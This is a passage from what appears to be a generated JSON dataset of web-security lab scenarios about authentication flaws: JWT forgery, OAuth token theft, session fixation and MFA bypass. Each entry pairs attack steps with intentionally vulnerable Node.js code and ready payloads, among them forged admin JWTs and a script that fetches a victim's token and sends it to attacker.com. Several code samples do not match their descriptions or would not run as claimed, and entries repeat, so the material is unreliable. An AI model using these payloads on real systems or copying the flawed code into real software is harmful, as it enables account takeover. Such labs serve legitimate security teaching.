    "Solution Steps": [
      "Intercept gRPC traffic with compression enabled",
      "Send brute-force MFA codes and measure response sizes",
      "Identify compression ratio differences for valid codes",
      "Derive correct MFA code through statistical analysis",
      "Bypass MFA with derived code"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const grpc = require('@grpc/grpc-js');\nconst server = new grpc.Server();\nserver.addService(mfaProto.MFA.service, {\n  verify(call, callback) {\n    const code = call.request.code;\n    if (code === '654321') {\n      callback(null, { verified: true });\n    } else {\n      const error = new Error(`Invalid code ${code}. Please try again with a 6-digit code.`);\n      error.code = grpc.status.INVALID_ARGUMENT;\n      callback(error);\n    }\n  }\n});\nserver.bindAsync('0.0.0.0:50051', grpc.ServerCredentials.createInsecure(), () => {\n  server.start();\n});",
    "payloads": [
      "{\"code\":\"111111\"}",
      "{\"code\":\"222222\"}\n{\"code\":\"333333\"}\n{\"code\":\"444444\"}\n{\"code\":\"555555\"}\n{\"code\":\"666666\"}"
    ]
  },
  {
    "Lab scenario": "JWT alg:none bypass in REST API authentication",
    "Lab Description": "The application uses JWT for session management but fails to properly validate the algorithm. The vulnerable endpoint /api/admin accepts unsigned tokens when alg:none is specified. To solve: Forge an administrative JWT without knowing the secret key.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept a valid JWT using Burp Suite and decode it in the JWT Editor extension",
      "Modify the algorithm header to 'none' and change the role to 'admin' in the payload",
      "Remove the signature section entirely (leave it empty after the second dot)",
      "Send the modified token to /api/admin endpoint using Postman",
      "Verify access to admin panel at /api/admin/dashboard"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst app = express();\n\napp.get('/api/admin', (req, res) => {\n  const token = req.headers.authorization.split(' ')[1];\n  const decoded = jwt.decode(token, {complete: true});\n  \n  if (decoded.header.alg === 'none') {\n    const payload = decoded.payload;\n    if (payload.role === 'admin') {\n      return res.json({access: 'granted'});\n    }\n  }\n  res.status(403).json({error: 'Forbidden'});\n});\n\napp.listen(3000);",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYXR0YWNrZXIiLCJyb2xlIjoiYWRtaW4ifQ.",
      "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0Iiwicm9sZSI6ImFkbWluIn0."
    ]
  },
  {
    "Lab scenario": "OAuth token leakage via misconfigured callback in SPA",
    "Lab Description": "The single-page application implements OAuth 2.0 with implicit flow but exposes access tokens in browser history due to improper callback handling. The application stores OAuth tokens in URL fragments. To solve: Retrieve victim's access token from browser history and access their profile data.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Analyze OAuth flow using OWASP ZAP to identify token leakage points",
      "Craft malicious page that forces victim to initiate OAuth flow",
      "Exploit history.pushState to capture token from redirect URL",
      "Extract access_token parameter from simulated browser history",
      "Use stolen token in API requests to /user/profile endpoint"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/oauth/callback', (req, res) => {\n  const token = req.query.access_token;\n  res.redirect(`/welcome#token=${token}`);\n});\n\napp.get('/user/profile', (req, res) => {\n  const token = req.headers.authorization;\n  if (token === 'Bearer stolen_token') {\n    return res.json({email: 'victim@example.com'});\n  }\n  res.status(401).send('Unauthorized');\n});\n\napp.listen(3000);",
    "payloads": [
      "<script>history.replaceState({},'','/malicious#access_token=stolen_token')</script>",
      "http://victim.com/oauth/callback?access_token=stolen_token"
    ]
  },
  {
    "Lab scenario": "Session fixation via GraphQL mutation",
    "Lab Description": "The GraphQL API allows session fixation by accepting arbitrary session identifiers through the createSession mutation. The application doesn't regenerate session IDs after authentication. To solve: Fixate a session ID and trick the victim into authenticating with it.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Send introspection query to discover available mutations",
      "Use createSession mutation to generate predictable session ID",
      "Force victim browser to use this session via XSS or link injection",
      "Wait for victim to authenticate with fixated session",
      "Access victim account using the known session ID"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const { ApolloServer } = require('apollo-server-express');\nconst typeDefs = `\n  type Mutation {\n    createSession(id: String): Session\n  }\n  type Session {\n    id: String\n  }\n`;\n\nconst resolvers = {\n  Mutation: {\n    createSession: (_, { id }) => {\n      return { id: id || Math.random().toString(36).substr(2, 9) };\n    }\n  }\n};\n\nconst server = new ApolloServer({ typeDefs, resolvers });",
    "payloads": [
      "mutation { createSession(id: \"fixed123\") { id } }",
      "POST /graphql {\"query\":\"mutation($id:String!){createSession(id:$id){id}}\",\"variables\":{\"id\":\"attacker_controlled\"}}"
    ]
  },
  {
    "Lab scenario": "MFA bypass via state parameter manipulation in SOAP service",
    "Lab Description": "The SOAP-based authentication service implements MFA but fails to validate the state parameter between steps. The application trusts client-provided state values after MFA verification. To solve: Bypass MFA by manipulating state parameters in the authentication flow.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture initial SOAP auth request using Burp Suite",
      "Note the state parameter in the MFA initiation response",
      "Intercept MFA verification request and modify state to match first step",
      "Replay modified request before token expiration",
      "Access protected resource with obtained session token"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.text({type: '*/xml'}));\n\nlet states = {};\n\napp.post('/soap/auth', (req, res) => {\n  const state = Math.random().toString(36).substr(2, 12);\n  states[state] = { verified: false };\n  res.type('application/xml');\n  res.send(`<AuthResponse><State>${state}</State></AuthResponse>`);\n});\n\napp.post('/soap/verify', (req, res) => {\n  const state = req.body.match(/<State>(.*?)<\\/State>/)[1];\n  states[state].verified = true;\n  res.type('application/xml');\n  res.send(`<VerifyResponse><Token>valid_token</Token></VerifyResponse>`);\n});\n\napp.listen(3000);",
    "payloads": [
      "<Envelope><Body><Verify><State>attacker_controlled</State><Code>123456</Code></Verify></Body></Envelope>",
      "<Envelope><Body><Auth><Username>admin</Username></Auth></Body></Envelope>"
    ]
  },
  {
    "Lab scenario": "JWT kid header injection in microservice authentication",
    "Lab Description": "The microservice architecture uses JWT with kid header pointing to local files for key verification. The application fails to sanitize kid header values, allowing path traversal. To solve: Forge admin JWT by loading arbitrary local files as verification keys.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept valid JWT using Burp Suite and analyze kid header in JWT Editor",
      "Modify kid header to point to /dev/null or known static files (like /etc/passwd)",
      "Craft new token with alg:HS256 and kid:/var/www/keys/static_key.pub",
      "Sign token with simple key (like 'secret') and verify error responses",
      "Access /admin/api endpoint with forged token to retrieve flag"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst fs = require('fs');\nconst app = express();\n\napp.get('/admin/api', (req, res) => {\n  const token = req.headers.authorization.split(' ')[1];\n  const decoded = jwt.decode(token, {complete: true});\n  \n  try {\n    const key = fs.readFileSync(decoded.header.kid);\n    jwt.verify(token, key);\n    res.json({flag: process.env.FLAG});\n  } catch (e) {\n    res.status(403).send('Invalid token');\n  }\n});\n\napp.listen(3000);",
    "payloads": [
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii9kZXYvbnVsbCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.dBj6Je1Z3X3oI8Dtn0lt31kYd5pJZIAqZQZ3l2VnlIQ",
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii92YXIvd3d3L2tleXMvc3RhdGljX2tleS5wdWIifQ.eyJ1c2VyIjoiYWRtaW4ifQ.1HtH7lJZ4X3oI8Dtn0lt31kYd5pJZIAqZQZ3l2VnlIQ"
    ]
  },
  {
    "Lab scenario": "OAuth token swapping via insecure state validation",
    "Lab Description": "The OAuth implementation in the React frontend fails to properly validate state parameters during callback. The application trusts client-side state verification, allowing token swapping. To solve: Intercept OAuth flow and replace victim's auth code with your own while maintaining valid state.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Initiate OAuth flow in OWASP ZAP while intercepting requests",
      "Capture state parameter and authorization code from callback URL",
      "Modify state parameter in Postman to match victim's session",
      "Swap authorization code while preserving modified state",
      "Exchange stolen code for access token at /oauth/token endpoint"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst app = express();\n\nlet oauthStates = {};\n\napp.get('/oauth/callback', (req, res) => {\n  const { code, state } = req.query;\n  if (oauthStates[state]) {\n    res.cookie('auth', code);\n    res.redirect('/profile');\n  } else {\n    res.status(400).send('Invalid state');\n  }\n});\n\napp.post('/oauth/token', (req, res) => {\n  const { code } = req.body;\n  res.json({access_token: 'stolen_token'});\n});\n\napp.listen(3000);",
    "payloads": [
      "http://target.com/oauth/callback?code=STOLEN_CODE&state=ATTACKER_STATE",
      "POST /oauth/token {\"code\":\"victim_code\"}"
    ]
  },
  {
    "Lab scenario": "Session token leakage via GraphQL verbose errors",
    "Lab Description": "The GraphQL endpoint leaks session tokens through verbose error messages when malformed queries are submitted. The application's debug mode remains enabled in production. To solve: Extract valid session tokens from error responses and hijack user sessions.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Send malformed GraphQL queries using Postman to trigger errors",
      "Analyze error responses for leaked session information",
      "Identify pattern in session token generation",
      "Extract valid tokens from error stack traces",
      "Use stolen tokens in Authorization header to access /userProfile"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const { ApolloServer } = require('apollo-server-express');\nconst typeDefs = `\n  type Query {\n    getUser: User\n  }\n  type User {\n    id: ID\n    name: String\n  }\n`;\n\nconst resolvers = {\n  Query: {\n    getUser: (_, __, context) => {\n      if (!context.session) throw new Error('Invalid session: '+context.sessionToken);\n      return { id: 1, name: 'Admin' };\n    }\n  }\n};\n\nconst server = new ApolloServer({\n  typeDefs,\n  resolvers,\n  debug: true,\n  formatError: (err) => {\n    return { message: err.message, stack: err.stack };\n  }\n});",
    "payloads": [
      "query { invalidField }\n# Returns error with session token",
      "mutation { __typename }"
    ]
  },
  {
    "Lab scenario": "MFA bypass via race condition in REST API",
    "Lab Description": "The MFA verification endpoint suffers from a race condition where the first valid code disables verification for subsequent requests. The application fails to implement proper transaction locking. To solve: Send parallel requests with valid and invalid codes to bypass MFA protection.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture MFA verification request in Burp Suite",
      "Send multiple parallel requests using Turbo Intruder",
      "Mix valid and invalid codes in payloads",
      "Identify successful bypass when one valid code authenticates all requests",
      "Access restricted /transfer endpoint with stolen session"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst app = express();\napp.use(express.json());\n\nlet mfaCodes = {};\n\napp.post('/verify-mfa', (req, res) => {\n  const { user, code } = req.body;\n  if (mfaCodes[user] === code) {\n    delete mfaCodes[user];\n    res.json({verified: true});\n  } else {\n    res.status(403).json({verified: false});\n  }\n});\n\napp.post('/transfer', (req, res) => {\n  if (!req.headers.authorization) {\n    res.status(401).send('Unauthorized');\n  } else {\n    res.send('Transfer complete');\n  }\n});\n\napp.listen(3000);",
    "payloads": [
      "POST /verify-mfa [{\"user\":\"victim\",\"code\":\"123456\"},{\"user\":\"victim\",\"code\":\"111111\"}]",
      "POST /verify-mfa {\"user\":\"victim\",\"code\":\"VALID_CODE\"}\nPOST /verify-mfa {\"user\":\"victim\",\"code\":\"INVALID_CODE\"}"
    ]
  },
  {
    "Lab scenario": "JWT signature stripping via header injection in REST API",
    "Lab Description": "The API endpoint /admin/panel uses JWT authentication but fails to validate signature when custom headers are injected. The application processes unsigned tokens if x-algorithm header is present. To solve: Gain admin access by stripping JWT signature while maintaining valid payload.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept valid JWT request in Burp Suite and add x-algorithm: none header",
      "Remove JWT signature section (content after second dot) while keeping header and payload",
      "Modify payload role to 'admin' and send to /admin/panel endpoint",
      "Verify successful bypass by checking HTTP 200 response",
      "Access restricted admin functions at /admin/panel/dashboard"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst app = express();\n\napp.get('/admin/panel', (req, res) => {\n  const token = req.headers.authorization.split(' ')[1];\n  const options = {};\n  if (req.headers['x-algorithm']) {\n    options.algorithms = [req.headers['x-algorithm']];\n  }\n  try {\n    const decoded = jwt.verify(token, 'secret_key', options);\n    if (decoded.role === 'admin') {\n      res.json({access: 'granted'});\n    }\n  } catch (e) {\n    res.status(403).json({error: 'Forbidden'});\n  }\n});\n\napp.listen(3000);",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYXR0YWNrZXIiLCJyb2xlIjoiYWRtaW4ifQ.",
      "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiYWRtaW4ifQ.ignored_signature"
    ]
  },
  {
    "Lab scenario": "OAuth token leakage via insecure redirect_uri validation",
    "Lab Description": "The OAuth implementation fails to properly validate redirect_uri parameters, allowing tokens to be leaked to attacker-controlled domains. The application doesn't verify exact match of registered callback URLs. To solve: Steal authorization code by modifying redirect_uri to point to malicious server.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Initiate OAuth flow in OWASP ZAP and intercept authorization request",
      "Modify redirect_uri parameter to attacker-controlled domain",
      "Let victim complete authentication flow",
      "Capture authorization code in attacker server logs",
      "Exchange code for access token at /oauth/token endpoint"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst app = express();\n\nconst clients = {\n  'client123': {\n    secret: 'secret123',\n    redirectUris: ['https://*.example.com/callback']\n  }\n};\n\napp.get('/oauth/authorize', (req, res) => {\n  const { client_id, redirect_uri } = req.query;\n  const client = clients[client_id];\n  \n  if (client && redirect_uri.includes('example.com')) {\n    const code = 'random_code';\n    res.redirect(`${redirect_uri}?code=${code}`);\n  } else {\n    res.status(400).send('Invalid request');\n  }\n});\n\napp.listen(3000);",
    "payloads": [
      "http://victim.com/oauth/authorize?client_id=client123&redirect_uri=https://attacker.com/callback",
      "http://victim.com/oauth/authorize?client_id=client123&redirect_uri=https://subdomain.attacker.example.com/callback"
    ]
  },
  {
    "Lab scenario": "Session fixation via GraphQL websocket connection",
    "Lab Description": "The GraphQL subscription endpoint over websockets accepts arbitrary session IDs during connection initialization. The application doesn't regenerate session IDs after authentication. To solve: Fixate session ID through websocket connection and hijack authenticated session.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Establish websocket connection to /graphql with custom session_id parameter",
      "Capture connection initialization frame in Burp Suite",
      "Modify session_id to predictable value and reconnect",
      "Trick victim into authenticating with fixated session ID",
      "Access privileged data through subscription queries"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const { ApolloServer } = require('apollo-server-express');\nconst typeDefs = `\n  type Subscription {\n    secretData: String\n  }\n`;\n\nconst resolvers = {\n  Subscription: {\n    secretData: {\n      subscribe: (_, __, { sessionId }) => {\n        if (authenticatedSessions[sessionId]) {\n          return pubSub.asyncIterator('SECRET_DATA');\n        }\n      }\n    }\n  }\n};\n\nconst server = new ApolloServer({\n  typeDefs,\n  resolvers,\n  subscriptions: {\n    onConnect: (params) => {\n      return { sessionId: params.sessionId || generateRandomId() };\n    }\n  }\n});",
    "payloads": [
      "{\"type\":\"connection_init\",\"payload\":{\"sessionId\":\"attacker_controlled\"}}",
      "{\"query\":\"subscription { secretData }\"}"
    ]
  },
  {
    "Lab scenario": "MFA bypass via time-limited code reuse",
    "Lab Description": "The MFA implementation allows previously used codes to remain valid for short time windows after being consumed. The application fails to immediately invalidate used codes. To solve: Intercept valid MFA code and reuse it within the allowed time frame.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept valid MFA submission in Burp Suite",
      "Note timestamp of successful verification",
      "Resend same code within 30 second window",
      "Verify successful authentication with reused code",
      "Access protected /account endpoint with stolen session"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst app = express();\napp.use(express.json());\n\nconst activeCodes = {};\n\napp.post('/verify-mfa', (req, res) => {\n  const { user, code } = req.body;\n  \n  if (activeCodes[user] === code) {\n    setTimeout(() => delete activeCodes[user], 30000);\n    res.json({verified: true});\n  } else {\n    res.status(403).json({verified: false});\n  }\n});\n\napp.get('/account', (req, res) => {\n  res.json({secret: 'STOLEN_DATA'});\n});\n\napp.listen(3000);",
    "payloads": [
      "POST /verify-mfa {\"user\":\"victim\",\"code\":\"VALID_CODE\"}",
      "POST /verify-mfa {\"user\":\"victim\",\"code\":\"PREVIOUSLY_USED_CODE\"}"
    ]
  },
  {
    "Lab scenario": "JWT algorithm confusion via exposed public key in REST API",
    "Lab Description": "The API exposes its public key at /jwks.json endpoint but fails to properly validate JWT algorithm. The application accepts RS256-signed tokens when configured for HS256. To solve: Forge admin token by signing with public key as HMAC secret.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Retrieve public key from /jwks.json using Postman",
      "Convert JWK to PEM format using online tools",
      "Craft JWT with alg:HS256 and admin claims in Burp Suite JWT Editor",
      "Sign token using public key as HMAC secret",
      "Send forged token to /admin endpoint to gain access"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst jwksClient = require('jwks-rsa');\nconst app = express();\n\nconst client = jwksClient({\n  jwksUri: 'http://localhost:3000/jwks.json'\n});\n\napp.get('/admin', (req, res) => {\n  const token = req.headers.authorization.split(' ')[1];\n  const decoded = jwt.decode(token, {complete: true});\n  \n  if (decoded.header.alg === 'HS256') {\n    jwt.verify(token, getKey, {algorithms: ['HS256']}, (err, payload) => {\n      if (payload.role === 'admin') {\n        res.json({flag: process.env.FLAG});\n      }\n    });\n  }\n});\n\napp.listen(3000);",
    "payloads": [
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4ifQ.SIGNED_WITH_PUBLIC_KEY",
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.SIGNED_WITH_PUBLIC_KEY"
    ]
  },
  {
    "Lab scenario": "OAuth token hijacking via insecure PKCE implementation",
    "Lab Description": "The OAuth flow uses PKCE but fails to properly validate code_verifier. The application doesn't enforce code_challenge_method matching. To solve: Bypass PKCE protection by omitting code_verifier parameter during token exchange.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept authorization code flow in OWASP ZAP",
      "Capture authorization code from callback URL",
      "Send token request without code_verifier parameter",
      "Analyze response for access token leakage",
      "Use stolen token to access user resources"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst app = express();\n\nconst authCodes = {};\n\napp.post('/oauth/token', (req, res) => {\n  const { code } = req.body;\n  \n  if (authCodes[code]) {\n    res.json({\n      access_token: 'stolen_token',\n      token_type: 'Bearer'\n    });\n  }\n});\n\napp.listen(3000);",
    "payloads": [
      "POST /oauth/token {\"code\":\"STOLEN_CODE\",\"grant_type\":\"authorization_code\"}",
      "POST /oauth/token {\"code\":\"STOLEN_CODE\",\"client_id\":\"legit_client\"}"
    ]
  },
  {
    "Lab scenario": "Session fixation via HTTP/2 connection coalescing",
    "Lab Description": "The application assigns session IDs during HTTP/2 connection establishment. The server reuses session IDs for coalesced connections to same origin. To solve: Fixate session ID by forcing victim to reuse your connection.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Establish HTTP/2 connection and note session ID in Burp Suite",
      "Craft malicious page that loads resources from target domain",
      "Trick victim into visiting malicious page",
      "Monitor for session ID reuse in server logs",
      "Hijack authenticated session"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const http2 = require('http2');\nconst fs = require('fs');\n\nconst server = http2.createSecureServer({\n  key: fs.readFileSync('server.key'),\n  cert: fs.readFileSync('server.crt')\n});\n\nconst sessions = {};\n\nserver.on('stream', (stream, headers) => {\n  const sessionId = stream.session.id.toString('hex');\n  \n  if (!sessions[sessionId]) {\n    sessions[sessionId] = {\n      sessionToken: require('crypto').randomBytes(16).toString('hex')\n    };\n  }\n  \n  stream.respond({\n    'content-type': 'text/html',\n    ':status': 200\n  });\n  \n  stream.end(`<html>Your session: ${sessions[sessionId].sessionToken}</html>`);\n});\n\nserver.listen(443);",
    "payloads": [
      "<script src='https://victim.com/resource'></script>",
      "<link rel='stylesheet' href='https://victim.com/styles.css'>"
    ]
  },
  {
    "Lab scenario": "MFA bypass via state parameter tampering in SOAP API",
    "Lab Description": "The SOAP-based MFA verification trusts client-provided state parameters. The application doesn't validate state between authentication steps. To solve: Modify state parameter to bypass MFA after initial authentication.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture SOAP MFA initiation request in Burp Suite",
      "Note state parameter value",
      "Intercept MFA verification request",
      "Modify state to match initial request value",
      "Submit request to bypass MFA protection"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.text({type: '*/xml'}));\n\nlet mfaStates = {};\n\napp.post('/soap/mfa', (req, res) => {\n  const state = req.body.match(/<state>(.*?)<\\/state>/)[1];\n  \n  if (mfaStates[state]) {\n    res.type('application/xml');\n    res.send('<Verified>true</Verified>');\n  }\n});\n\napp.listen(3000);",
    "payloads": [
      "<Envelope><Body><Verify><state>ATTACKER_CONTROLLED</state></Verify></Body></Envelope>",
      "<Envelope><Body><Initiate><state>ATTACKER_CONTROLLED</state></Initiate></Body></Envelope>"
    ]
  },
  {
    "Lab scenario": "JWT authentication bypass via key confusion in microservice architecture",
    "Lab Description": "The microservice authentication gateway accepts both HS256 and RS256 tokens but fails to properly validate key material. The application exposes public keys via /.well-known/jwks.json endpoint. To solve: Forge admin token by signing with public key as HMAC secret.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Retrieve public key from /.well-known/jwks.json using Postman",
      "Convert JWK to PEM format using online tools",
      "Craft JWT with alg:HS256 and admin:true claim using Burp Suite JWT Editor",
      "Sign token using public key as HMAC secret",
      "Send forged token to /admin-api endpoint to gain privileged access"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst jwksClient = require('jwks-rsa');\nconst app = express();\n\nconst client = jwksClient({\n  jwksUri: 'http://localhost:3000/.well-known/jwks.json'\n});\n\napp.get('/admin-api', (req, res) => {\n  const token = req.headers.authorization.split(' ')[1];\n  const decoded = jwt.decode(token, {complete: true});\n  \n  const getKey = (header, callback) => {\n    if (header.alg === 'HS256') {\n      return callback(null, client.getSigningKey());\n    }\n    client.getSigningKey(header.kid, (err, key) => {\n      callback(err, key.publicKey || key.rsaPublicKey);\n    });\n  };\n  \n  jwt.verify(token, getKey, {algorithms: ['RS256', 'HS256']}, (err, payload) => {\n    if (payload.admin) {\n      res.json({secret: process.env.ADMIN_SECRET});\n    }\n  });\n});\n\napp.listen(3000);",
    "payloads": [
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6dHJ1ZX0.SIGNED_WITH_PUBLIC_KEY",
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IjEyMzQifQ.eyJ1c2VyIjoiYWRtaW4ifQ.SIGNED_WITH_PUBLIC_KEY"
    ]
  },
  {
    "Lab scenario": "OAuth token leakage via open redirect in mobile app deep linking",
    "Lab Description": "The mobile app's OAuth implementation accepts arbitrary redirect URIs in the deep link handler. The application fails to validate redirect_uri against allowlist when processing authorization codes. To solve: Steal authorization code by intercepting deep link with attacker-controlled redirect URI.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept OAuth initiation request in Burp Suite",
      "Modify redirect_uri parameter to attacker-controlled domain",
      "Capture authorization code in server logs",
      "Exchange code for access token at /oauth/token endpoint",
      "Use stolen token to access user resources via API"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/oauth/authorize', (req, res) => {\n  const { client_id, redirect_uri } = req.query;\n  \n  if (client_id === 'mobile_app') {\n    const code = generateAuthCode();\n    res.redirect(`${redirect_uri}?code=${code}`);\n  } else {\n    res.status(400).send('Invalid client');\n  }\n});\n\napp.post('/oauth/token', (req, res) => {\n  const { code } = req.body;\n  res.json({access_token: 'stolen_token'});\n});\n\napp.listen(3000);",
    "payloads": [
      "myapp://oauth?redirect_uri=https://attacker.com/callback",
      "https://victim.com/oauth/authorize?client_id=mobile_app&redirect_uri=https://attacker.com/callback"
    ]
  },
  {
    "Lab scenario": "Session fixation via WebSocket connection ID reuse",
    "Lab Description": "The real-time application assigns session tokens during WebSocket connection establishment. The server reuses session IDs for reconnecting clients with same connection ID. To solve: Fixate session ID by forcing victim to reuse your WebSocket connection parameters.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Establish WebSocket connection and note connection parameters",
      "Craft malicious page that forces victim to reuse connection ID",
      "Intercept victim authentication over WebSocket",
      "Hijack authenticated session using fixated connection ID",
      "Access privileged real-time data streams"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const WebSocket = require('ws');\n\nconst wss = new WebSocket.Server({ port: 8080 });\n\nconst sessions = {};\n\nwss.on('connection', (ws, req) => {\n  const connectionId = req.headers['sec-websocket-key'];\n  \n  if (!sessions[connectionId]) {\n    sessions[connectionId] = {\n      token: null,\n      authenticated: false\n    };\n  }\n  \n  ws.on('message', (message) => {\n    const data = JSON.parse(message);\n    \n    if (data.type === 'login') {\n      sessions[connectionId].token = data.token;\n      sessions[connectionId].authenticated = true;\n    }\n    \n    if (sessions[connectionId].authenticated) {\n      ws.send(JSON.stringify({secretData: 'VALUE'}));\n    }\n  });\n});",
    "payloads": [
      "{\"type\":\"login\",\"token\":\"VICTIM_TOKEN\"}",
      "{\"type\":\"request\",\"data\":\"SECRET\"}"
    ]
  },
  {
    "Lab scenario": "MFA bypass via time-of-check to time-of-use race condition",
    "Lab Description": "The MFA verification endpoint has a race window between code validation and session marking. The application doesn't use atomic operations for MFA state transitions. To solve: Send parallel requests to bypass MFA by exploiting the race condition.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept valid MFA code submission in Burp Suite",
      "Send 20 parallel requests with same valid code using Turbo Intruder",
      "Identify successful bypass when one request authenticates session",
      "Hijack authenticated session cookie",
      "Access protected admin panel"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst app = express();\napp.use(express.json());\n\nconst mfaCodes = {};\n\napp.post('/verify-mfa', (req, res) => {\n  const { user, code } = req.body;\n  \n  if (mfaCodes[user] === code) {\n    setTimeout(() => {\n      mfaCodes[user] = null;\n      res.json({verified: true});\n    }, 100);\n  } else {\n    res.status(403).json({verified: false});\n  }\n});\n\napp.get('/admin', (req, res) => {\n  res.json({flag: process.env.FLAG});\n});\n\napp.listen(3000);",
    "payloads": [
      "POST /verify-mfa {\"user\":\"victim\",\"code\":\"VALID_CODE\"}",
      "POST /verify-mfa {\"user\":\"victim\",\"code\":\"VALID_CODE\"}\nPOST /verify-mfa {\"user\":\"victim\",\"code\":\"VALID_CODE\"}"
    ]
  },
  {
    "Lab scenario": "JWT authentication bypass via header injection in API gateway",
    "Lab Description": "The API gateway validates JWT tokens but fails to properly sanitize header values. The application processes unsigned tokens when x-verify-algorithm header is present. To solve: Gain admin access by stripping JWT signature while injecting custom verification header.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept valid JWT request in Burp Suite and add x-verify-algorithm: none header",
      "Remove JWT signature section while keeping header and payload",
      "Modify payload role to 'admin' and remove original signature",
      "Send modified token to /admin-api endpoint with custom header",
      "Verify access to privileged endpoints"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst app = express();\n\napp.get('/admin-api', (req, res) => {\n  const token = req.headers.authorization.split(' ')[1];\n  const options = {};\n  \n  if (req.headers['x-verify-algorithm']) {\n    options.algorithms = [req.headers['x-verify-algorithm']];\n  }\n  \n  try {\n    const decoded = jwt.verify(token, 'secret_key', options);\n    if (decoded.role === 'admin') {\n      res.json({access: 'granted'});\n    }\n  } catch (e) {\n    res.status(403).json({error: 'Forbidden'});\n  }\n});\n\napp.listen(3000);",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.",
      "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiYWRtaW4ifQ."
    ]
  },
  {
    "Lab scenario": "OAuth token leakage via misconfigured CORS in SPA",
    "Lab Description": "The single-page application implements OAuth with overly permissive CORS headers. The API endpoints allow arbitrary origins and include credentials in responses. To solve: Retrieve access token by making cross-origin requests from malicious site.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Analyze OAuth flow using OWASP ZAP to identify token endpoints",
      "Craft malicious HTML page making cross-origin requests to /oauth/token",
      "Capture access token in response using attacker server",
      "Use stolen token to access /user/profile endpoint",
      "Extract sensitive user data from API responses"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.use((req, res, next) => {\n  res.header('Access-Control-Allow-Origin', req.headers.origin);\n  res.header('Access-Control-Allow-Credentials', 'true');\n  next();\n});\n\napp.get('/oauth/token', (req, res) => {\n  res.json({access_token: 'stolen_token'});\n});\n\napp.get('/user/profile', (req, res) => {\n  res.json({email: 'victim@example.com'});\n});\n\napp.listen(3000);",
    "payloads": [
      "<script>fetch('https://victim.com/oauth/token').then(r=>r.json()).then(d=>fetch('https://attacker.com/steal?token='+d.access_token))</script>",
      "fetch('https://victim.com/user/profile', {credentials: 'include'})"
    ]
  },
  {
    "Lab scenario": "Session fixation via HTTP/2 connection coalescing",
